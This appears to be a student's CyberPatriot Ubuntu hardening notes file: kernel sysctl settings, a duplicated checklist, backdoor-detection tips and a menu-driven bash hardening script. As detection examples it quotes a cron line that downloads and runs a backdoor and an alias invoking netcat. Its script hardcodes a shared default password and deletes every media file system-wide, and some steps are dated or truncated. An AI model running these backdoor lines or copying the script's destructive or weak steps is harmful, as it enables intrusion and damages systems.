FIX SCRIPT 3 IT SOLD



# linxchecklist

Install Fail2ban

Protect against brute-force attacks:

    sudo apt-get install fail2ban

    sudo apt-get install fail2ban


Configure /etc/fail2ban/jail. local as needed and start the service:

    sudo systemctl start fail2ban
    sudo systemctl enable fail2ban

Install and Configure Lynis for Security Audits

Run a security audit to identify issues:

    sudo apt-get install lynis
    sudo lynis audit system

Kernel Hardening

dev.tty.ldisc_autoload: This should be set to 0 to prevent the automatic loading of line disciplines.

 

    sudo sysctl -w dev.tty.ldisc_autoload=0

fs.protected_fifos: This should be set to 2 to protect named pipes (FIFOs) from being created in world-writable directories.

 

    sudo sysctl -w fs.protected_fifos=2

fs.protected_symlinks: This should be set to 1 to protect symlinks from being created in world-writable directories.

 

    sudo sysctl -w fs.protected_symlinks=1

fs.suid_dumpable: This should be set to 0 to disable core dumps for SUID programs.

 

    sudo sysctl -w fs.suid_dumpable=0

kernel.kptr_restrict: This should be set to 2 to restrict access to kernel pointers.

 

    sudo sysctl -w kernel.kptr_restrict=2

kernel.modules_disabled: This should be set to 1 to disable module loading.

 

    sudo sysctl -w kernel.modules_disabled=1

kernel.perf_event_paranoid: This should be set to 3 to restrict access to performance events.

 

    sudo sysctl -w kernel.perf_event_paranoid=3

kernel.randomize_va_space: This should be set to 2 for full randomization of the address space.

 

    sudo sysctl -w kernel.randomize_va_space=2

kernel.sysrq: This should be set to 0 to disable the magic SysRq key.

 

    sudo sysctl -w kernel.sysrq=0

kernel.unprivileged_bpf_disabled: This should be set to 1 to disable unprivileged BPF.

 

    sudo sysctl -w kernel.unprivileged_bpf_disabled=1

net.core.bpf_jit_harden: This should be set to 2 to harden BPF JIT compilation.

 

    sudo sysctl -w net.core.bpf_jit_harden=2

net.ipv4.conf.all.rp_filter: This should be set to 1 for strict reverse path filtering.

 

    sudo sysctl -w net.ipv4.conf.all.rp_filter=1

net.ipv4.conf.all.send_redirects: This should be set to 0 to disable ICMP redirects.

 

    sudo sysctl -w net.ipv4.conf.all.send_redirects=0

net.ipv4.conf.default.log_martians: This should be set to 1 to log martian packets.

 

    sudo sysctl -w net.ipv4.conf.default.log_martians=1

net.ipv4.tcp_syncookies: This should be set to 1 to enable TCP SYN cookies.

 

    sudo sysctl -w net.ipv4.tcp_syncookies=1



1. Forensic questions

2. Disable guest user

        In /etc/lightdm/lightdm.conf add the line "allow-guest=false"
        Restart with "sudo restart lightdm" (will log you out)

3. Check users

        In /etc/passwd check for users that
            Are uid 0 (root users)
            Are not allowed in the readme (comment them out)
        In /etc/group verify users are in the correct groups and that no groups have a GUD of 0
        Add any users specified in readme with "adduser [username]"

4. Secure sudo

        Check /etc/sudoers to verify only users from group sudo can sudo (do so with visudo)
        Verify only admins have access to /etc/sudoers and /etc/sudoers.d
        Check /etc/group and remove non-admins from sudo and admin groups
        Verify with the command "sudo -l -U [username]" to see sudo permissions

5. Check for unauthorized files/packages

        Use "cd /home" then "ls -Ra *"  to find unauthorized files (can also use tree for this)
            Can also use "ls *.[filetype]" to search by file types
        Check for unauthorized packages with "apt list --installed"
        Check for unauthorized services with "service --status-all" (can also use Synaptic or BUM for managing services)

6. Change password requirements

        In /etc/login.defs add
            PASS_MIN_DAYS 7
            PASS_MAX_DAYS 90
            PASS_WARN_AGE 14
        Use "apt-get install libpam-cracklib" then in /etc/pam.d/common-password add
            "minlen=8" and "remember=5" to the line with pam_unix.so in it
            Add "ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-" to the line with pam.cracklib.so in it
        In /etc/pam.d/common-auth add "deny=5 unlock_time=1800" to the end of the line with "pam_tally2.so" in it to add an account lockout policy

7. Change all passwords

        Use the command "passwd [user]" to change passwords to a secure password
        Use "passwd -a -S" to verify all passwords are set up correctly

8. Enable auto-updates + other small things

        In GUI go to settings and under updates set everything to the best available option
        In Firefox/Chrome/browser go to settings and read through and set everything to the most secure option (auto-updates, pop-up blocker, block dangerous downloads, display warning on known bad sites, etc.)
        Start updates with "apt-get update" and "apt-get upgrade"
        Set a message of the day in /etc/motd
        Disable sharing the screen by going to settings -> sharing then turn it off
        Use "apt-get autoremove --purge samba" to remove samba

9. Secure ports

        Use the command "ss -ln" to check for open ports that are not on the loopback
        For open ports that need to be closed
            Use "lsof -i :[port]" or "netstat -lntp" then copy the program listening on the port with "whereis [program]" then copy where the program is with "dpkg -S [location]" then remove the associated package with "apt-get purge [package]"
            Verify the removal with "ss -ln"

10. Secure the network

        Enable the firewall with "ufw enable"
        Enable syn cookie protection with "sysctl -n net.ipv4.tcp_syncookies"
        Disable IPv6 with "echo "net.ipv6.conf.all.disable_ipv6 = 1" | sudo tee -a /etc/sysctl.conf" (make sure it isn't needed in read-me)
        Disable IP forwarding with "echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward"
        Prevent IP spoofing with "echo "nospoof on" | sudo tee -a /etc/host.conf"
        Disable ICMP responses with "echo “net.ipv4.icmp_echo_ignore_all = 1” >> /etc/sysctl.conf"
        Use "sysctl -p" then restart sysctl with "sysctl --system"
        Configure firewall (can also be done through Gufw)
            Check for rules with "ufw status numbered" and delete any with "ufw delete [number]"
            Add new rules with "ufw allow [port]"

11. Secure services

        Check config files for any services installed to secure them (PHP, SQL, WordPress, FTP, SSH, and Apache are common services that need to be secured)
            For hosting services such as WordPress, FTP, or websites verify the files are not sensitive or prohibited
            Google "how to secure [service] ubuntu"
        Verify all services are legitimate with "service --status-all" (can also use Synaptic or BUM)
        Verify the services do not use any default credentials

12. Check permissions for sensitive files

        Check the permissions of the files with "ls -al"
            Check /etc/passwd, /etc/group, /etc/shadow, /etc/sudoers, and /var/www
        The permissions should be "-rw-r----- root: shadow"
        Use "chmod -R 640 [path]" to modify the permissions

13. Check for malware

        Check /etc/rc.local to see if it contains anything other than "exit 0"
        Use "ps -aux" to list running services, check if lkl, uberkey, THC-vlogger, PyKeylogger, or logkeys are running
        Install rkhunter then update the properties with "rkhunter --propupd" then run with "rkhunter --checkall"

14. Secure SSH (if needed in readme)

        In /etc/ssh/sshd_config
            Change the port from default
            Set LoginGraceTime to 20
            Set PermitRootLogin to no
            Set StrictModes to yes
            Set MaxAuthTries to 3
            Set PermitEmptyPasswords to no
            Change and uncomment protocol line to "Protocol 2"
            Optional: For keyless authentication set PasswordAuthentication to no
        Restart ssh with "service sshd restart"

15. Install security packages (not sure if needed)

            Auditd:
                Install with "apt-get install auditd"
                Run it with "auditctl -e 1"
            Fail2ban:
                Install with "apt install fail2ban"
                Verify its running with "systemctl status fail2ban"
                Configure with "cp /etc/fail2ban/jail.{conf,local}" then edit /etc/fail2ban/jail.local
                Restart it with "systemctl restart fail2ban"
            SELinux: Be careful with it
                Install with "apt-get install selinux"
                In ""/etc/selinux/config" set the state of SELinux to "enforcing"

            PSAD:



How to attach to cp process and monitor its activity


for i in {1..999999999} ; do clear ; netstat -lntp ; w ; date ; sleep 3 ; done






# cyberpatriot-checklist-ubuntu

Ubuntu cyber-patriot checklist

1. Forensic questions

2. Disable guest user

        In /etc/lightdm/lightdm.conf add the line "allow-guest=false"
        Restart with "sudo restart lightdm" (will log you out)

3. Check users

        In /etc/passwd check for users that
            Are uid 0 (root users)
            Are not allowed in the readme (comment them out)
        In /etc/group verify users are in the correct groups and that no groups have a GUD of 0
        Add any users specified in readme with "adduser [username]"

4. Secure sudo

        Check /etc/sudoers to verify only users from group sudo can sudo (do so with visudo)
        Verify only admins have access to /etc/sudoers and /etc/sudoers.d
        Check /etc/group and remove non-admins from sudo and admin groups
        Verify with the command "sudo -l -U [username]" to see sudo permissions

5. Check for unauthorized files/packages

        Use "cd /home" then "ls -Ra *"  to find unauthorized files (can also use tree for this)
            Can also use "ls *.[filetype]" to search by file types
        Check for unauthorized packages with "apt list --installed"
        Check for unauthorized services with "service --status-all" (can also use Synaptic or BUM for managing services)

6. Change password requirements

        In /etc/login.defs add
            PASS_MIN_DAYS 7
            PASS_MAX_DAYS 90
            PASS_WARN_AGE 14
        Use "apt-get install libpam-cracklib" then in /etc/pam.d/common-password add
            "minlen=8" and "remember=5" to the line with pam_unix.so in it
            Add "ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-" to the line with pam.cracklib.so in it
        In /etc/pam.d/common-auth add "deny=5 unlock_time=1800" to the end of the line with "pam_tally2.so" in it to add an account lockout policy

7. Change all passwords

        Use the command "passwd [user]" to change passwords to a secure password
        Use "passwd -a -S" to verify all passwords are set up correctly

8. Enable auto-updates + other small things

        In GUI go to settings and under updates set everything to the best available option
        In Firefox/Chrome/browser go to settings and read through and set everything to the most secure option (auto-updates, pop-up blocker, block dangerous downloads, display warning on known bad sites, etc.)
        Start updates with "apt-get update" and "apt-get upgrade"
        Set a message of the day in /etc/motd
        Disable sharing the screen by going to settings -> sharing then turn it off
        Use "apt-get autoremove --purge samba" to remove samba

9. Secure ports

        Use the command "ss -ln" to check for open ports that are not on the loopback
        For open ports that need to be closed
            Use "lsof -i :[port]" or "netstat -lntp" then copy the program listening on the port with "whereis [program]" then copy where the program is with "dpkg -S [location]" then remove the associated package with "apt-get purge [package]"
            Verify the removal with "ss -ln"

10. Secure the network

        Enable the firewall with "ufw enable"
        Enable syn cookie protection with "sysctl -n net.ipv4.tcp_syncookies"
        Disable IPv6 with "echo "net.ipv6.conf.all.disable_ipv6 = 1" | sudo tee -a /etc/sysctl.conf" (make sure it isn't needed in read-me)
        Disable IP forwarding with "echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward"
        Prevent IP spoofing with "echo "nospoof on" | sudo tee -a /etc/host.conf"
        Disable ICMP responses with "echo “net.ipv4.icmp_echo_ignore_all = 1” >> /etc/sysctl.conf"
        Use "sysctl -p" then restart sysctl with "sysctl --system"
        Configure firewall (can also be done through Gufw)
            Check for rules with "ufw status numbered" and delete any with "ufw delete [number]"
            Add new rules with "ufw allow [port]"

11. Secure services

        Check config files for any services installed to secure them (PHP, SQL, WordPress, FTP, SSH, and Apache are common services that need to be secured)
            For hosting services such as WordPress, FTP, or websites verify the files are not sensitive or prohibited
            Google "how to secure [service] ubuntu"
        Verify all services are legitimate with "service --status-all" (can also use Synaptic or BUM)
        Verify the services do not use any default credentials

12. Check permissions for sensitive files

        Check the permissions of the files with "ls -al"
            Check /etc/passwd, /etc/group, /etc/shadow, /etc/sudoers, and /var/www
        The permissions should be "-rw-r----- root: shadow"
        Use "chmod -R 640 [path]" to modify the permissions

13. Check for malware

        Check /etc/rc.local to see if it contains anything other than "exit 0"
        Use "ps -aux" to list running services, check if lkl, uberkey, THC-vlogger, PyKeylogger, or logkeys are running
        Install rkhunter then update the properties with "rkhunter --propupd" then run with "rkhunter --checkall"

14. Secure SSH (if needed in readme)

        In /etc/ssh/sshd_config
            Change the port from default
            Set LoginGraceTime to 20
            Set PermitRootLogin to no
            Set StrictModes to yes
            Set MaxAuthTries to 3
            Set PermitEmptyPasswords to no
            Change and uncomment protocol line to "Protocol 2"
            Optional: For keyless authentication set PasswordAuthentication to no
        Restart ssh with "service sshd restart"

15. Install security packages (not sure if needed)

            Auditd:
                Install with "apt-get install auditd"
                Run it with "auditctl -e 1"
            Fail2ban:
                Install with "apt install fail2ban"
                Verify its running with "systemctl status fail2ban"
                Configure with "cp /etc/fail2ban/jail.{conf,local}" then edit /etc/fail2ban/jail.local
                Restart it with "systemctl restart fail2ban"
            SELinux: Be careful with it
                Install with "apt-get install selinux"
                In ""/etc/selinux/config" set the state of SELinux to "enforcing"

            PSAD:



How to attach to cp process and monitor its activity


for i in {1..999999999} ; do clear ; netstat -lntp ; w ; date ; sleep 3 ; done



1. Check authorized_keys for unauthorized entries:

       cat ~/.ssh/authorized_keys

Ensure no unauthorized public keys are present. If a foreign key, such as root@kali, is found, remove it immediately.


2. Identifying Suspicious SSH MOTD Backdoors
Check for unauthorized scripts in /etc/update-motd.d/:

       ls -l /etc/update-motd.d/

Ensure there are no unauthorized scripts, especially those related to network communication like nc (Netcat).




Monitor recent file changes in MOTD scripts:

    ls --full-time /etc/update-motd.d/



3. Monitoring User’s .bashrc for Backdoors
Look for suspicious entries in .bashrc:

        cat ~/.bashrc

Remove any unauthorized commands, such as reverse shells (nc) or unexpected scripts that run automatically.


4. Checking Aliases for Backdoors
Inspect aliases that may execute backdoor commands:

       alias
   
Check if any aliases are set up to execute malicious commands, such as:

     alias cd='$(nc ...)'


5. Detecting Cronjob-based Backdoors
Review crontab for unauthorized scheduled jobs:

       crontab -l
   
Ensure no malicious tasks are scheduled to run, such as downloading and executing backdoors:

     * * * * * root cd /tmp; wget malicious-url/backdoor && ./backdoor




6. Checking for Services Backdoors
List all active services for suspicious entries:

        systemctl list-unit-files --type=service
   
Ensure there are no unknown or suspicious services, such as backdoor.service.



7. Detecting SUID Backdoors
Find all SUID files (files with setuid permissions):

       find / -type f -perm -u=s 2>/dev/null
   
SUID files allow a command to be executed with the permissions of the file owner (often root). Ensure no unauthorized binaries are present, especially hidden ones.



7. Detecting SUID Backdoors
Find all SUID files (files with setuid permissions):

        find / -type f -perm -u=s 2>/dev/null
   
SUID files allow a command to be executed with the permissions of the file owner (often root). Ensure no unauthorized binaries are present, especially hidden ones.


FORENSICS

Forensics Question IP Address of the Compromised Site EXAMPLE
Scenario: “We suspect that our server has been compromised through a download from an external site. What is the IP address of the site that we have been compromised through?”
Solution:
Search the download history of the browser (e.g., Firefox) and locate the suspicious file, innocent 2.xslm. Identify the site the file was downloaded from and use the ping command to retrieve the IP address:

    ping <site_url>



USE AT MY OWN RISK IT WORKS BUT IDK HOW WELL
    
    #!/bin/bash

    pause(){
       read -p "
    Press [ENTER] to continue" placeholder
    }

    update_and_configure_settings(){
       sudo apt update -y
       sudo apt dist-upgrade -y
       sudo apt upgrade -y
       sudo apt-get install -f -y
       sudo apt autoremove -y
       sudo apt autoclean -y
       sudo apt-get check
    }

    install_security_programs(){
       sudo apt-get install -y chkrootkit clamav rkhunter apparmor apparmor-profiles ufw
    }

    configure_firewall(){
       sudo ufw enable
       wait
       sudo ufw status verbose
       sudo ufw default deny incoming
       sudo ufw default allow outgoing
       sudo ufw allow ssh
       sudo ufw allow http
       sudo ufw allow https
       sudo ufw deny 23
       sudo ufw deny 2049
       sudo ufw deny 515
       sudo ufw deny 111
       sudo ufw logging high
       read -p "Is SSH/OpenSSH Authorized? (ReadME) [y/n] > " prompt
       case "$prompt" in
          y ) sudo ufw allow OpenSSH; sudo apt install openssh-server -y;;
          n ) sudo apt purge openssh-server -y;;
       esac
       sudo sed -i '/^PermitRootLogin/ c\PermitRootLogin no' /etc/ssh/sshd_config
       sudo service ssh restart
    }

    verify_user_admin_list(){
       echo "Looking inside... /etc/passwd"
       cat /etc/passwd
       python3 user_admin_list.py
    }

    user_prompt(){
       read -p "Select from one of the following choices:
       [1] Add a new user
       [2] Remove a current user and their directories
       [3] Create a new password for a user
      > " prompt
       case "${prompt}" in
          1 ) add_user;;
          2 ) remove_user;;
          3 ) create_password;;
       esac
    }

    disable_root_access(){
       sudo sed -i '/^auth       sufficient pam_rootok.so/ c\#auth       sufficient pam_rootok.so/' /etc/pam.d/su
    }

    create_password(){
      read -p "Enter username to create new password for: " username
       sudo passwd ${username}
    }

    add_user(){
       read -p "Enter username to add: " username
       pass=$(perl -e 'print crypt("1Soup3rS*Cure!", "supersalter3000")')
       sudo useradd -m -p ${pass} ${username}
       echo "Username ${username} has been added. Password: 1Soup3rS*Cure!"
    }

    remove_user(){
       read -p "Enter username to remove: " username
       sudo userdel -r ${username}
       echo "Username ${username} has been deleted."
    }

    group_management(){
       read -p "Select from one of the following choices:
       [1] Create a group
       [2] Remove a group
       [3] Add a user to a group
       [4] Remove a user from a group
      > " prompt
     case "${prompt}" in
         1 ) read -p "Enter group name to create: " name; sudo groupadd ${name}; echo "Added group ${name}";;
         2 ) read -p "Enter a group name to remove: " name; sudo groupdel ${name}; echo "Removed group ${name}";;
         3 ) read -p "Enter a group name: " group; read -p "Enter a user to be added: " user; sudo adduser ${user} ${group};;
         4 ) read -p "Enter a group name: " group; read -p "Enter a user to be removed: " user; sudo deluser ${user} ${group};;
      esac
    }

    disable_guest_and_remote_login(){
       GUEST_CONFIG_FILE="/usr/share/lightdm/lightdm.conf.d/50-no-guest.conf"
       REMOTE_LOGIN_CONFIG_FILE="/usr/share/lightdm/lightdm.conf.d/50-no-remote-login.conf"
       echo -e "[SeatDefaults]\nallow-guest=false\n" | sudo tee "$GUEST_CONFIG_FILE" > /dev/null
       echo -e "[SeatDefaults]\ngreeter-show-remote-login=false\n" | sudo tee "$REMOTE_LOGIN_CONFIG_FILE" > /dev/null
    }

    update_password_req(){
       sudo apt-get install libpam_pwquality
       mkdir ~/Desktop/Backups
       cp /etc/pam.d/common-password ~/Desktop/Backups/common-password
       cp /etc/pam.d/common-auth ~/Desktop/Backups/common-auth
       cp ~/Desktop/configs/common-password /etc/pam.d/common-password
       cp ~/Desktop/configs/common-auth /etc/pam.d/common-auth
    }

    file_permissions(){
       sudo chmod 644 /etc/passwd
       sudo chmod 640 /etc/shadow
       sudo chmod 644 /etc/group
       sudo chmod 640 /etc/gshadow
       sudo chmod 440 /etc/sudoers
       sudo chmod 644 /etc/ssh/sshd_config
       sudo chmod 644 /etc/fstab
       sudo chmod 600 /boot/grub/grub.cfg
       sudo chmod 644 /etc/hostname
       sudo chmod 644 /etc/hosts
       sudo chmod 600 /etc/crypttab
       sudo chmod 640 /var/log/auth.log
       sudo chmod 644 /etc/apt/sources.list
       sudo chmod 644 /etc/systemd/system/*.service
       sudo chmod 644 /etc/resolv.conf
    }

    remove_malware_hacking(){
       sudo apt purge wireshark* ophcrack* nmap* netcat* hydra* john* nikto* aircrack-ng* -y
       sudo systemctl stop nginx
       sudo systemctl disable nginx
    }

    scan_for_viruses(){
       sudo chkrootkit -q
       rkhunter --update
       rkhunter --propupd # Run this once at install
       rkhunter -c --enable all --disable none
       systemctl stop clamav-freshclam
       freshclam --stdout
       systemctl start clamav-freshclam
       clamscan -r -i --stdout --exclude-dir="^/sys" /
    }

    find_and_delete_media(){
       sudo find / -type f \( -name '*.mp3' -o -name '*.mov' -o -name '*.mp4' -o -name '*.avi' -o -name '*.mpg' -o -name '*.mpeg' -o -name '*.flac' -o -name '*.m4a' -o -name '*.flv' -o -name '*.ogg' \) -delete
       sudo find /home/* -type f \( -name '*.gif' -o -name '*.png' -o -name '*.jpg' -o -name '*.jpeg' \) -delete
    }

    enforce_password_reqs(){
       sudo sed -i 's/PASS_MAX_DAYS.*/PASS_MAX_DAYS    90/' /etc/login.defs
       sudo sed -i 's/PASS_MIN_DAYS.*/PASS_MIN_DAYS    7/' /etc/login.defs
       sudo sed -i 's/PASS_WARN_AGE.*/PASS_WARN_AGE    14/' /etc/login.defs
       sudo sed -i '/pam_unix.so/ s/$/ minlen=8 remember=5/' /etc/pam.d/common-password
       sudo sed -i 's/nullok/ /g' /etc/pam.d/common-auth
    }

    while true; do
       read -p "Select from one of the following choices:
       [1] Check for Updates & Install Security Programs
       [2] Verify User & Admin List
          [2.1] User Management
          [2.2] Group Management
       [3] Disable Guest Account & Greeter Remote Login
       [4] Update Password Requirements
       [5] Disable Root Access 
       [6] Configure Firewall & OpenSSH
       [7] Check all file permissions (SAVE SNAPSHOT BEFORE)
       [8] Remove Malware & Hacking Tools
       [9] Scan for Viruses
       [10] Find and Delete Media Files
      > " OPTION
       case "${OPTION}" in
           1 ) echo "Check for Updates & Install Security Programs \n"; update_and_configure_settings; install_security_programs;;
           2 ) echo "Verify User & Admin List \n"; verify_user_admin_list;;
           2.1 ) echo "User Management"; user_prompt;;
           2.2 ) echo "Group Management"; group_management;;
           3 ) echo "Disable Guest Account & Greeter Remote Login"; disable_guest_and_remote_login;;
           4 ) echo "Update Password Requirements"; update_password_req; enforce_password_reqs;;
           5 ) echo "Disable Root Access"; disable_root_access;;
           6 ) echo "Configure Firewall (UFW) \n"; configure_firewall;;
           7 ) echo "Set all file permissions (SAVE SNAPSHOT BEFORE)"; file_permissions;;
           8 ) echo "Remove Malware & Hacking Tools"; remove_malware_hacking;;
           9 ) echo "Scan for Viruses"; scan_for_viruses;;
           10 ) echo "Find and Delete Media Files"; find_and_delete_media;;
       esac
       pause
       echo ""
    done


    echo "Linux hardening complete! Please review the system for any additional manual checks."
